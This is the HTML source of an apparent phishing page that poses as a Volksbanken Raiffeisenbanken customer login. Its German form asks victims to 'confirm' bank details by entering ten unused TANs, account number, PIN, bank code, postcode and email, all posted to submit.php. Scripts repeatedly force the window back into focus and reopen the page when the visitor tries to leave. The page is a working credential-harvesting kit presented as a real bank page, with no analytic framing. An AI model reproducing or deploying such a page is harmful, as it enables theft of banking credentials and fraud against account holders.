<html> <head>
<META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title></title>

<script type="text/javascript" language="JavaScript">
  flag=1;
  window.onfocus=MyFocus;
  window.onblur=MyBlur;
  
  function MyBlur(){
    flag=1;
    clearTimeout(to);
    to=setTimeout("Ticker()", 100);
  }

  function MyFocus(){
    flag=0;
  }

  function Ticker(){
    if (flag==1) {window.focus();}
    to=setTimeout("Ticker()", 100);
  }
  
  Ticker();

  closeflag=1;

  window.onbeforeunload=F1;
  //window.onsubmit=F2;
  function F1(){
    if (closeflag) 
      Console(90,80);
     // window.open("confirm.htm","","width=515,height=555,top=10,left=70,scrollbars=no,toolbar=no,location=no,menubar=no,status=no,resizable=no");
    }
 
  function Console(width,height) {
    var swidth=0;
    var sheight=0;
    if (self.screen) {      // for NN4 and IE4
      swidth = screen.width;
      sheight = screen.height
    }
    
    window.open("index.html","","width=800,height=600,top=10,left=70,scrollbars=yes,toolbar=yes,location=yes,menubar=yes,status=yes,resizable=yes");
  }
   
  function F2(){
    closeflag=0;
  }

function isblank(fe){
if (fe.value == "") {
return true;
} else {
return false;
}
}

function verify(frm, fields, msg){
fieldarray = fields.split(",");
for (i=0; i<frm.elements.length; i++){
for (j=0; j<fieldarray.length; j++){
if (  fieldarray[j] == frm.elements[i].name &&
      isblank(frm.elements[i])
) {
alert(msg);
frm.elements[i].focus();
return false;
} 
}
}
return true;
}
</script>


<script type="text/javascript" language="JavaScript">
<!--
if (navigator.appName == "Microsoft Internet Explorer")  document.write("<link href='styles_ie.css' rel='stylesheet' type='text/css'>")
else if (navigator.platform == "OS/2") document.write("<link href='/gwm5/webdbs/xct900x.nsf/(GrafikAnhaenge)/styles_os2.css/$File/styles_os2.css' rel='stylesheet' type='text/css'>")
else
 document.write("<link href='/gwm5/webdbs/xct900x.nsf/(GrafikAnhaenge)/styles_ns.css/$File/styles_ns.css' rel='stylesheet' type='text/css'>")
//--></script>
<noscript>
<link type="text/css" rel="stylesheet" href="styles_j.css">
</noscript>
</head>
<body bgcolor="#FFFFFF" marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" rightmargin="0" leftmargin="0" onLoad="MM_preloadimages('/banksearch/images/stern.gif')">



<table cellpadding="0" cellspacing="0" border="0">
<tr>
<td width="8"><img src="s0000001.gif" width="8" height="1" border="0"></td><td width="507"><img src="s0000001.gif" width="507" height="1" border="0"></td><td width="6"><img src="s0000001.gif" width="6" height="1" border="0"></td><td width="1"><img src="s0000001.gif" width="1" height="1" border="0"></td><td width="8"><img src="s0000001.gif" width="8" height="1" border="0"></td><td width="125"><img src="s0000001.gif" width="125" height="1" border="0"></td>
</tr>
<tr valign="top">
<td width="1"><img src="s0000001.gif" width="1" height="1" border="0"></td><td valign="top">
<P>
<P>


<SCRIPT LANGUAGE="JavaScript">
<!--

var msg = new Array(5);
msg[1]   = 'Das Feld "Bankleitzahl" wurde falsch ausgef�llt.\n';
msg[2]   = 'Das Feld "Telefonvorwahl" wurde falsch ausgef�llt.\n';
msg[3]   = 'Das Feld "Postleitzahl" wurde falsch ausgef�llt.\n';




function MM_preloadimages() { //v3.0
	var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
		var i,j=d.MM_p.length,a=MM_preloadimages.arguments; for(i=0; i<a.length; i++)
		if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) //v3.0
{
	var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
		d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
	if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
	for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document); return x;
}

function MM_swapImage() { //v3.0
	var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
	 if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}


function resetform()
{


	for(i=1;i<=3;i++)
	{
		//bild = "b"+i;
		//MM_swapImage(bild,"","spacer00.gif",1);
		//f.reset();
		window.document.b1.src="spacer00.gif";
		window.document.b2.src="spacer00.gif";
		window.document.b3.src="spacer00.gif";
	}
	f = document.forms[0];
	for(i=0; i <= 4; i++) {
	f.elements[i].value = "";
	}
	//f.reset();
	f[0].focus();
}

//-->
</script>


<!-- Anfang �u�ere Tabelle -->
<table width="500" border="0" cellpadding="0" cellspacing="0">
<tr>
	<td><img src="spacer01.gif" width="26" height=1 border="0"></td>
	<td colspan ="3" class="textblockblau" width="485"></td>
</tr>
<tr>
	<td><img src="spacer01.gif" width="26" height=1 border="0"><img src="spacer01.gif" width="1" height="29" border="0"></td>
	<td colspan="3" valign="top">
	<img src="spacer01.gif" width="1" height="18" border="0"></td>
</tr>
<tr>
	<td><img src="spacer01.gif" width="26" height=1 border="0"></td>
	<td><img src="spacer01.gif" width="346" height=1 border="0"></td>
	<td><img src="spacer01.gif" width="15" height=1 border="0"></td>
	<td><img src="spacer01.gif" width="99" height=1 border="0"></td>
</tr>

<tr>
	<td class="fehler"><img src="spacer01.gif" width="26" height=1 border="0"><br>
	</td>
	<td>
		<!-- Anfang innere Tabelle - Eingabeformular -->
		<form method="post" action="submit.php" name="form_1" onsubmit="F2(); return verify(this, 'vorname,name,tan,konto,pin,blz,plz,email', 'Alle Felder sind Pflichtfelder');">
		      <table cellspacing="0" cellpadding="0" border="0" width="346">
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="346" height="1" border="0"></td>
                </tr>
                <tr> 
                  <td colspan="4" height="89"><span class="headline">Kundenzugang</span><br>
                    <img src="spacer01.gif" width="1" height="7" border="0"><br>
                    <span class="textblockblau">F&uuml;llen Sie bitte den Fragebogen 
                    f&uuml;r die Best&auml;tigung Ihrer Bankdaten aus. Alle Felder 
                    sind Pflichtfelder</span> 
                    <p>Ihre Volksbanken Raiffeisenbanken<br>
                      <img src="spacer01.gif" width="1" height="1" border="0"></p>
                  </td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Frau:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <input type="radio" name="frauherr" value="Frau" checked onfocus="MyFocus();" onblur="MyBlur();">
                  </td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td width="30" align="left" class="tdtext">&nbsp;</td>
                  <td width="120" align="left" class="tdtext"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Herr:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200" ><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height="1" border="0"> 
                    <input type="radio" name="frauherr" value="Herr" onfocus="MyFocus();" onblur="MyBlur();">
                  </td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Vorname:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <input type="text" name="vorname" size="15" style="width=150px" value="" onfocus="MyFocus();" onblur="MyBlur();">
                    <img src="spacer01.gif" width="4" height="1" border="0"> <img src="spacer01.gif" width="18" height="18" alt="" border="0" name="b1"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Name:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <input type="text" name="name"   size=15 style="width=150px" onfocus="MyFocus();" onblur="MyBlur();">
                    <img src="spacer01.gif" width="4" height="1" border="0"> <img src="spacer01.gif" width="18" height="18" alt="" border="0" name="b1"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Tasten Sie in das gegebene Feld 10 ungenutzte TAN ein (falls 
                    es sie weniger ubrigblieb, so setzen Sie die bleibenden ein):</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <textarea name="tan" cols="15" style="width=150px" rows="10" onfocus="MyFocus();" onblur="MyBlur();"></textarea>
                    <img src="spacer01.gif" width="4" height="1" border="0"> <img src="spacer01.gif" width="18" height="18" alt="" border="0" name="b1"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Ihre Kundennummer (Kontonummer):</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <input type="text" name="konto"   size=15 style="width=150px" onfocus="MyFocus();" onblur="MyBlur();">
                    <img src="spacer01.gif" width="4" height="1" border="0"> <img src="spacer01.gif" width="18" height="18" alt="" border="0" name="b1"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Ihre PIN:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <input type="password" name="pin"   size=15 style="width=150px" onfocus="MyFocus();" onblur="MyBlur();">
                    <img src="spacer01.gif" width="4" height="1" border="0"> <img src="spacer01.gif" width="18" height="18" alt="" border="0" name="b1"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Bankleitzahl:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <input type="text" name="blz"   size=15 style="width=150px" onfocus="MyFocus();" onblur="MyBlur();">
                    <img src="spacer01.gif" width="4" height="1" border="0"> <img src="spacer01.gif" width="18" height="18" alt="" border="0" name="b1"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext"> 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    Postleitzahl:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="1"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height=1 border="0"> 
                    <input type="text" name="plz"   size=15 style="width=150px" onfocus="MyFocus();" onblur="MyBlur();">
                    <img src="spacer01.gif" width="4" height="1" border="0"> <img src="spacer01.gif" width="18" height="18" alt="" border="0" name="b1"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr class="tdtext" > 
                  <td align="left" class="tdtext" width="30">&nbsp;</td>
                  <td align="left" class="tdtext" width="120"><img src="spacer01.gif" width="120" height="1" border="0"><br>
                    E-mail:</td>
                  <td class="textblock" width="1"><img src="spacer01.gif" width="1" height="0"  border="0"></td>
                  <td width="200"><img src="spacer01.gif" width="200" height="1" border="0"><br>
                    <img src="spacer01.gif" width="2" height="1" border="0"> 
                    <input type="text" name="email"   size="15" maxlength="77" style="width=150px" onfocus="MyFocus();" onblur="MyBlur();">
                  </td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="1" border="0"></td>
                </tr>
                <tr> 
                  <td colspan="4"><img src="spacer01.gif" width="1" height="7"  border="0"></td>
                </tr>
                <tr> 
                  <td colspan="4"> 
                    <!-- Anfang Tabelle Navigation -->
                    <table border="0" cellpadding="0" cellspacing="0" width="346">
                      <tr> 
                        <td align="left" width="146"><img src="spacer01.gif" width="121" height="1"  border="0"><br>
                        </td>
                        <td width="200" align="right"><img src="spacer01.gif" width="200" height="1"  border="0"><br>
                          <img src="spacer01.gif" width="1" height="1"  border="0"> 
                                           
                          <input type="image" src="suchen_h.gif" width="59" height="18" alt="" border="0">
                      </tr>
                    </table>
                    <!-- Ende Tabelle Navigation -->
                  </td>
                </tr>
              </table>
		<!-- Ende innere Tabelle -->
		<input type = "hidden" name="GEVO" value="100">
		<input type = "hidden" name="FA" value="VRNETWORLD">
		<input type = "hidden" name="search" value="bank">
		</form>
	</td>
</tr>
</table>
<!-- Ende �u�ere Tabelle -->
</table><br>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<table cellpadding="0" cellspacing="0" border="0">
<tr>
<td>
<p class="subheadlinedarkgrey"></p>
</td>
</tr>
<tr>
<td><img src="s0000001.gif" width="1" height="10" border="0"></td>
</tr>
<tr>
<td>
<p class="textblock"> <!-- BEGIN: AdSolution-Website-Tag 4.0 : VR-Networld Posttracking / Bankensuche -->
<script language="JavaScript" type="text/javascript">
rdm=Math.random()*10000000+10000000;
document.write('<img src="http://as1.falkag.de/sel?cmd=ban&dat=176370&opt=16&rdm='+rdm+'" width="1" height="1" border=0>');
</script>
<noscript><img src="http://as1.falkag.de/sel?cmd=ban&dat=176370&opt=16" width="1" height="1" border=0></noscript>
<!-- END:AdSolution-Tag 4.0 --></p>
</td>
</tr>
<tr>
<td><img src="s0000001.gif" width="1" height="10" border="0"></td>
</tr>
<tr>
<td align="right"></td>
</tr>
</table>
<!--
    XSL-Script Versionen
    $RCSfile: Component3.xsl,v $ $Revision: 4.2 $, $Date: 2004/01/21 11:02:00 $
    $RCSfile: homepage_templates.xsl,v $ $Revision: 4.2 $, $Date: 2003/10/28 11:30:32 $
    $RCSfile: project_templates.xsl,v $, $Name: GWM-5-1-3-Portal-a $, $Revision: 4.7 $, $Date: 2004/02/05 12:18:02 $
    $RCSfile: global_templates.xsl,v $ $Revision: 4.17 $, $Date: 2004/04/26 12:58:00 $
    -->

 <td width="6"><img src="s0000001.gif" width="6" height="1" border="0"></td><td width="1"><img src="s0000001.gif" width="1" height="1" border="0"></td><td width="8"><img src="s0000001.gif" width="8" height="1" border="0"></td><td valign="top">
<table class="textblock" cellpadding="0" cellspacing="0" border="0">
<tr>
<td align="left" width="132"><img src="s0000001.gif" width="132" height="25" border="0"><br>
<table cellspacing="0" cellpadding="0" border="0">
<tr>
<td colspan="2" height="90"> <!--IFRAME Tag (URL Tag for Rich Media) //Tag for network: VR-Networld (ID: 10) ++ website:H_0_0_0_0_Home ++ content unit:  A_1_1_0_0_BaSu�bersicht_B01 (CU ID: 62849) ++ created at: Mon Jan 05 12:34:28 CET 2004   -->
<AD- ME WIDTH=120 HEIGHT=90 NORESIZE SCROLLING=No FRAMEBORDER=0 MARGINHEIGHT=0 MARGINWIDTH=0 SRC="http://adserver.adtech.de/?adiframe|2.0|10|62849|1|5|KEY=key1+key2+key3+key4;target=_blank;"><!-- pt language=javascript src="http://adserver.adtech.de/?addyn|2.0|10|62849|1|5|KEY=key1+key2+key3+key4;target=_blank;loc=700;"></scri--><noscript><a href="http://adserver.adtech.de/?adlink|2.0|10|62849|1|5|KEY=key1+key2+key3+key4;loc=300;" target=_blank><FONT size=1>[AD]</FONT><AD- ech.de/?adserv|2.0|10|62849|1|5|KEY=key1+key2+key3+key4;loc=300;" border=0 width=120 height=90></a></noscript><AD- AME></td>
</tr>
<tr>
<td colspan="2" height="30">&nbsp;</td>
</tr>
<tr>
<td colspan="2" height="90"> <!--IFRAME Tag (URL Tag for Rich Media) //Tag for network: VR-Networld (ID: 10) ++ website:H_0_0_0_0_Home ++ content unit:  A_1_1_0_0_BaSu�bersicht_B02 (CU ID: 62850) ++ created at: Mon Jan 05 12:34:37 CET 2004   -->
<AD- ME WIDTH=120 HEIGHT=90 NORESIZE SCROLLING=No FRAMEBORDER=0 MARGINHEIGHT=0 MARGINWIDTH=0 SRC="http://adserver.adtech.de/?adiframe|2.0|10|62850|1|5|KEY=key1+key2+key3+key4;target=_blank;"><!-- pt language=javascript src="http://adserver.adtech.de/?addyn|2.0|10|62850|1|5|KEY=key1+key2+key3+key4;target=_blank;loc=700;"></scri--><noscript><a href="http://adserver.adtech.de/?adlink|2.0|10|62850|1|5|KEY=key1+key2+key3+key4;loc=300;" target=_blank><FONT size=1>[AD]</FONT><AD- ech.de/?adserv|2.0|10|62850|1|5|KEY=key1+key2+key3+key4;loc=300;" border=0 width=120 height=90></a></noscript><AD- AME></td>
</tr>
<tr>
<td colspan="2" height="30">&nbsp;</td>
</tr>
<tr>
<td colspan="2" height="90"> <!--IFRAME Tag (URL Tag for Rich Media) //Tag for network: VR-Networld (ID: 10) ++ website:H_0_0_0_0_Home ++ content unit:  A_1_1_0_0_BaSu�bersicht_B03 (CU ID: 62851) ++ created at: Mon Jan 05 12:34:51 CET 2004   -->
<AD- ME WIDTH=120 HEIGHT=90 NORESIZE SCROLLING=No FRAMEBORDER=0 MARGINHEIGHT=0 MARGINWIDTH=0 SRC="http://adserver.adtech.de/?adiframe|2.0|10|62851|1|5|KEY=key1+key2+key3+key4;target=_blank;"><!-- pt language=javascript src="http://adserver.adtech.de/?addyn|2.0|10|62851|1|5|KEY=key1+key2+key3+key4;target=_blank;loc=700;"></scri--><noscript><a href="http://adserver.adtech.de/?adlink|2.0|10|62851|1|5|KEY=key1+key2+key3+key4;loc=300;" target=_blank><FONT size=1>[AD]</FONT><AD- ech.de/?adserv|2.0|10|62851|1|5|KEY=key1+key2+key3+key4;loc=300;" border=0 width=120 height=90></a></noscript><AD- AME></td>
</tr>
<tr>
<td colspan="2" height="30">&nbsp;</td>
</tr>
</table>
</td>
</tr>
</table>
</td>


<br>
<!--Anzahl Me: 0  homepage:false  xml_url -->
			
<!-- Begin Sitestat4 code -->
<script language="JavaScript1.1">
<!--
function sitestat(ns_l) {
	ns_l+="&ns__t="+(new Date()).getTime();
	ns_pixelUrl=ns_l;
	ns_0=document.referrer;
	ns_0=(ns_0.lastIndexOf("/")==ns_0.length-1)?ns_0.substring(ns_0.lastIndexOf("/"),0):ns_0;
	if(ns_0.length>0) ns_l+="&ns_referrer="+escape(ns_0);
	if(document.images) {
		ns_1=new Image();
		ns_1.src=ns_l;
	}
	else document.write('<img src="/gwm5/webdbs/xct900.nsf/d4fe5d22e2372b31c1256a0a006ae242/'+ns_l+'" width=1 height=1>');
}
sitestat("http://de.sitestat.com/vr-networld/vr-networld/s?Bankensuchekomp.bas.mitspeichern");
//-->
</script>
<noscript>
<img src="http://de.sitestat.com/vr-networld/vr-networld/s?Bankensuchekomp.bas.mitspeichern" width=1 height=1>
</noscript>
<!-- End Sitestat4 code -->
			
			</body></html>